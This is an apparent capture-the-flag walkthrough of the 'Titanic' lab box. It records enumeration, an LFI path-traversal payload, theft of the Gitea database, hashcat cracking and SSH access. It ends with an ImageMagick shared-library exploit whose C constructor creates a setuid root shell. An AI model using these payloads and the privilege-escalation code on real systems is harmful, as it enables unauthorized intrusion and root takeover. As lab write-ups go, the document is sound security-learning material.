---
box: Titanic
date: 2025-09-16
category: Web
difficulty: Easy
tags:
  - web
  - LFI
  - sysadmin
  - developer
  - pwn
start: 2025-09-16 17:27
finish: 2025-09-16 21:37
status: complete
---

# Box Overview – Box-2025-09-16-Titanic

##### Enumeration with nmap

- **Timestamp:** 2025-09-16 17:27
- **Action:**
	- Visiting website first, then nmap scan for open ports.
- **Commands:**
	- `ip=10.129.69.210`, `nmap -p- --min-rate 2000 -Pn -oA scans/all $ip`, `nmap -p 22,80 -sVC $ip`, 
- **Notes:**
	- Detected activity on port 22 and 80 (ssh and http)
	- `Apache httpd 2.4.52` as a webserver, but strange redirect. Potentially other subdomains, might have to utilize hosts file to redirect after fuzz.
		- of note are `Supported Methods: GET HEAD POST OPTIONS`
	- `OpenSSH 8.9p1` running with Ubuntu listed - including OS scan in command list.
- **Next Steps:** 
	- Multiple:
		- Don't ssh bruteforce.
		- Fuzz subdomains.
		- Look for Ubuntu CVEs for apps and OS version.

##### Adding host

- **Timestamp:** 2025-09-16 17:35
- **Overview:**
	- Updating `/etc/hosts` locally to redirect properly.
	- `echo "${ip} titanic.htb" | sudo tee -a /etc/hosts`

##### Enumerating website

- **Timestamp:** 2025-09-16 17:39
- **Overview:**
	- Looks like a standard website, but will append wappalyzer output below:
		- Flask, Python, JQuery, Popper (interesting), jsDelivr
	- Check for submit fields to engage with app.

##### Engaging with app

- **Timestamp:** 2025-09-16 17:42
- **Overview:**
	- We get JSON output from the submission field, reflecting what we have input.
	- Possible to input stuff that breaks the JSON?

##### Burpsuite analysis of http submissions

- **Timestamp:** 2025-09-16 17:44
- **Action:** Opened burpsuite and set foxyproxy to burp. Intercepting requests for testing.
- **Commands:**
	- `burpsuite`, REST API
- **Notes:** 
	- Classic `POST` request. Modify post to investigate?
		- `/book` is the endpoint.
		- `/download?ticket=7690372e-3263-4b9d-af15-f842a7c2bf21.json` as a `GET` request follows.
- **Next Steps:** 
	- Try payloads to this endpoint.

##### Trying ticket=input queries - LFI vuln?

- **Timestamp:** 2025-09-16 17:50
- **Action:** 
	- Trying different queries.
- **Commands:** 
	- `GET /download?ticket=../../etc/passwd`, `GET /download?ticket=../../../etc/passwd`
- **Notes:** 
	- Boom, we have something with the second payload.
	- `developer:x:1000:1000:developer:/home/developer:/bin/bash`
	- This looks potentially promising, as `developer` user has bash privileges.
	- Have to investigate what `/bin/false` means, as `_laurel` and `pollinate` users have this. Probably a default lockout, can we manipulate?
	- Also `/bin/sync` for `sync` user.
- **Next Steps:** 
	- Maybe try bruteforcing access as developer through ssh if no fail2ban.
	- In this vein, maybe try checking for other endpoints (I swear, I didn't read the walkthrough *fingers crossed behind back*)

##### Gobuster or ffuf for vhost enum?

- **Timestamp:** 2025-09-16 17:57
- **Overview:**
	- Googling differences, how to use ffuf (usually I use this) for vhost discovery. Could possibly just try and fail with ffuf, I suspect responses may vary...
	- Looks like we have to provide `-H "HOST: FUZZ.titanic.htb.` as a CLI argument for ffuf.
	- Also needed to look up how to match/exclude status codes.
		- Otherwise we get `Status: 301` for returned results.

##### ffufing other vhosts

- **Timestamp:** 2025-09-16 18:06
- **Action:** 
	- Used ffuf to determine other vhosts on the IP
- **Commands:** 
	- `ffuf -w ~/hax/passwords/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://10.129.69.210' -fc 301 -H "HOST: FUZZ.titanic.htb"`
- **Notes:** 
	- Success, returned with `dev` listed as status code `200`
- **Next Steps:**
	- Investigate site.
	- Adding to `/etc/hosts` first...oops.
		- `echo "${ip} dev.titanic.htb" | sudo tee -a /etc/hosts`

##### omg gittea

- **Timestamp:** 2025-09-16 18:10
- **Overview:**
	- Omg it's gittea. Uh-oh, my own dev project runs on ubuntu with apache server and a gittea instance...
	- Does the gittea have rate limiting for password checks?!

##### wtf I can register

- **Timestamp:** 2025-09-16 18:12
- **Overview:**
	- As it sounds like, registered a dummy account under yours truly. Let's investigate these repos.

##### Docker config and flask app

- **Timestamp:** 2025-09-16 18:13
- **Action:**
	- Investigated git repos hosted on gittea
- **Commands:**
	- Web browser
- **Notes:**
	- Registered an account, registered account can browse repositories.
	- `developer/docker-config` and `developer/flask-app` are listed.
- **Next Steps:** 
	- Immediate intuition is that I can push a malicious update to the config or even the app. But what would I do?
	- Investigate the configs for more details, listed here:
		- Okay holy shit the `MYSQL` password is listed in the `docker-compose.yml` file for localhost on port 3306.
			- `MySQLP@$$w0rd!`
			- `MYSQL_USER: sql_svc`
			- `MYSQL_PASSWORD: sql_password`
		- Also two JSON tickets in the app:
			- `{"name": "Jack Dawson", "email": "jack.dawson@titanic.htb", "phone": "555-123-4567", "date": "2024-08-23", "cabin": "Standard"}`
			- `{"name": "Rose DeWitt Bukater", "email": "rose.bukater@titanic.htb", "phone": "643-999-021", "date": "2024-08-22", "cabin": "Suite"}`
			- Haha sense of humour, nice.
		- flask sourcecode available.
			- uses `os` - seen before with privesc on other boxes.
				- Could potentially own root and user this way:
					- Enumerating flags with LFI
					- Pushing malicious flask app that disclose those locations with os calls.
		- Maybe run a local instance of this.

---------
Dinner break

##### Cloning the repo

- **Timestamp:** 2025-09-16 19:12
- **Action:**
	- We clone the repo and run locally to investigate this.
- **Commands:** 
	- `git clone http://dev.titanic.htb/developer/docker-config.git`,`nvim docker-compose.yml` -> modify for `<directory of choice>`, `sudo docker-compose up`
- **Notes:** 
	- Success. We managed to run the app.
	- Exploring the locally hosted gittea instance, we can observe configuration options.
	- There's an install option to actually create what is needed for the app to run - including directory structure.
- **Next Steps:** 
	- Install gittea.
	- Find the directory structure for the data store.
	- Exploit original with the earlier LFI exploit.

##### Enumerating the directory and getting the db

- **Timestamp:** 2025-09-16 19:18
- **Action:** 
	- We installed gittea, and navigate the directory on our local machine.
- **Commands:** 
	- `ls -lat`, `/home/developer/gitea/data/gitea/gitea.db`
- **Notes:**
	- We found the directory (`gitea/data/gitea`) and use LFI to grab the db file.
	- `curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' -o gitea.db`
		- Tested with burpsuite.
- **Next Steps:**
	- Open with sqlite!

##### Explore db

- **Timestamp:** 2025-09-16 19:26
- **Action:**
	- We have the password, so let's use that to dig around in the database.
	- Note, I'm unfamiliar with sqlite, so we'll do some digging there too.
- **Commands:**
	- `sqlite3 gitea.db`
	- `.databases`
	- `.tables`
- **Notes:** 
	- Database includes r/w permissions.
	- Tables drops a huge list.
		- `user` table sticks out in spite of multiple others.
	- **Personal Note** don't forget `;`, I'm such a noob...
	- We can dump the user information and collect hashes.
- **Next Steps:** 
	- We can test the hash because we already have the developer password `MySQLP@$$w0rd!`

##### Finding hash type and cracking

- **Timestamp:** 2025-09-16 19:39
- **Action:**
	- Hashcat the hashes, check with earlier password.
- **Commands:** 
	- `giteaCracked.sh`
	- `select * from user;`
		- general dump, not as useful
	- `select name, passwd_hash_algo, passwd, salt from user;`
		- Everything you need in one place.
		- compile into file with base64 encoded passwd and salt, with `:` separators.
	- `hashcat -m 10900 ./developer_creds.txt ~/hax/passwords/SecLists/Passwords/Leaked-Databases/rockyou.txt`

- **Notes:** 
	- There's a script called gitea2hashcat, with `giteaCracked.sh`
		- Breakdown of the tool:
			- `data="$(sqlite3 "$DB_FILE" "SELECT name, passwd_hash_algo, salt, passwd FROM user;")"`
			- Base64 encode salt and password.
			- `echo -e "$name:$algo:$loop:$salt_b64:$passwd_b64"`
				- Algo replaces `pbkdf2` with `sha256`
		- **Personal note** reminds me of tools I've made in the past - simple but effective, saves time with a lot of cracking but not necessary (could do manual enumeration).
			- Like all automations, **assess timeline for tool making**.
		- In this situation, hashcat didn't recognize my string because `name` was included. Oops.
		- Honestly was going to dive deeper into removing field separators with awk or bash but no time.

![[titanic-hashcat-form.png]]
*The required format for hashcat*

![[titanic-sqlite-manual-enum.png]]
*Manual retrieval of sqlite data (backup plan)*

- Hashcat cracks the file with:
	- `hashcat -m 10900 ./developer_creds.txt ~/hax/passwords/SecLists/Passwords/Leaked-Databases/rockyou.txt`

- **Next Steps:** 
	- Trying user password on account details.
		- As ssh was open, we'll try this, `fail2ban` be damned!

##### SSH to `developer@titanic.htb`

- **Timestamp:** 2025-09-16 20:30
- **Overview:** 
	- We `ssh developer@titanic.htb`. Success!
	- `cat user.txt`
	- User owned.

##### Privesc enumeration

- **Timestamp:** 2025-09-16 20:34
- **Action:** 
	- We try and identify areas of interest on the machine
- **Commands:** 
	- `find / -group developer`
	- `magick --version`
- **Notes:** 
	- Spits out a lot of text but...we can see that /opt is an interesting folder.
		- **Future self**: keep a list of common linux folders, commands, etc for enumeration. linPEAS comes to mind.
	- Let's try investigating `opt`, as it's the only place outside of the `home` directory we have access to.
	- `/opt/app/` has our permissions on `ls -lat`
		- Huh, this is the ticket app we saw on the gitea repository.
	- `find /opt/app -type d -perm 770`
		- finds directory read/write permissions for user.
	- `scripts` is always a fun folder and we can see what's inside of it.

```
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

- Okay so what does the script actually do?
- What does `truncate` do? Like I'm familiar with the term but how does it truncate...
	- It appears our `-s` flag clears the log by setting byte size to 0
	- It finds all `.jpg` files 
- This part of the script runs on `/opt/app/static/assets/images/`, but how often?
	- We can explore metadata log and see. Huh, it was updated recently...how often does it update?

![[titanic-command-timeline.png]]
*We can see the script changing minute to minute*
- Feeling like a sysadmin noob, what does `xargs` do?
	- "Reads items from standard input delimited by blanks or newlines and executes the command one or more times with any initial-arguments followed by items read from standard input."
		- Okay so basically a fundamental way sets up command chains based on separated values of standard input, based on initial commands that may have multiple outputs (such as `find`)
- Okay, well, what is `magick`?
	- google -> *"ImageMagick on Ubuntu is popular open-source image software that allows you to manipulate images in almost every way."*
	- and identify?
		- https://imagemagick.org/script/identify.php
			- "See [Command Line Processing](https://imagemagick.org/script/command-line-processing.php) for advice on how to structure your magick identify command or see below for example usages of the command."
			- Potential avenue for maliciousness if it has issues.
		- CVE Found for this:
			- https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8
- Straight from the ImageMagick security advisory section, we have a payload that works with versions prior to `7.1.1-35`
	- `magick --version`
		- `Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org`

- **Next Steps:** 
	- Craft proper payload and deliver to the automated service.

##### Exploit the service

- **Timestamp:** 2025-09-16 21:16
- **Action:**
	- We're creating a shared library object in the working directory of magick (as detailed in the CVE)
- **Commands:** 
- The following exploit is actually posted in https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8
```
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /bin/sh /tmp && chmod u+s /tmp/sh");
    exit(0);
}
EOF
```
- Notes on the above gcc:
	- `-x c` forces following input to c, because otherwise it infers otherwise.
	- `-shared` ensures it's a shared object used at runtime
	- `-fPIC` is apparently position-independent code...which I will have to research later but is required by shared object libraries.
		- **Personal:** Time to study more C lol.
- `/tmp/sh -p`
	- Had to gander at this. Some clever sleight of hand.
- `whoami`
	- `root`
- `ls /root`
	- Output should be `root.txt`
- `cat root.txt`
- **Notes:** 
	- Remember to include that `.so` file in the directory in which magick executes, or no magic will happen.
	- We get flag. Yay.



















